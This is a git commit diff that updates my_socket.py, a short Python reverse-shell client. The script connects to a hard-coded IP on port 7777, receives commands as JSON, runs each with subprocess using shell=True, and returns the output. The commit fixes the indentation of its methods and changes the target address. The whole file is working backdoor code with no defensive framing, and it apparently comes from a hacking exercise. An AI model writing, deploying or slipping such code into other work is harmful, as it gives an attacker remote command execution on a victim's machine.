b5a585a028cd72b71d1622d45dab0b34929af46e
pateladvp <72961209+pateladvp@users.noreply.github.com>
2022-07-18 12:39:02 -0400

    Update my_socket.py

--- my_socket.py
+++ my_socket.py
@@ -1,34 +1,33 @@
 import socket
 import subprocess
 import json
+import base64
 
 class MySocket:
 	def __init__(self, ip, port):
 		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 		self.my_connection.connect((ip,port))
 
-		def command_exe(self, command):
-			return subprocess.check_output(command, shell=True)
+	def command_exe(self, command):
+		return subprocess.check_output(command, shell=True)
 
-		def json_sender(self, data):
-			json_data = json.dumps(data)
-			self.my_connection.send(json_data)
+	def json_send(self, data):
+		json_data_1 = json.dumps(data)
+		#json_data_1_encoded = json_data_1.encode('ascii')
+		self.my_connection.send(json_data_1.encode())
 
-		def json_receiver(self):
-			json_data = ""
-			while True:
-				try:
-					json_data = json_data + self.my_connection.recv(1024)
-					return json.loads(json_data)
-				except ValueError:
-					continue
+	def json_receive(self):
+		json_data_2 = self.my_connection.recv(1024)
+		#json_data_2_decoded = json_data_2.decode('ascii')
+		return json.loads(json_data_2)
 
-		def start_socket(self):
-			while True:
-				command = self.json_receiver()
-				command_output = self.command_exe(command)
-				self.json_sender(command_output)
-				self.my_connection.close()
+	def start_socket(self):
+		while True:
+			command = self.json_receive()
+			command_output = self.command_exe(command)
+			#print(command_output)
+			self.json_send(command_output)
+		self.my_connection.close()
 
-my_socket_connection = MySocket("192.168.0.114",7777)
+my_socket_connection = MySocket("192.168.0.112",7777)
 my_socket_connection.start_socket()
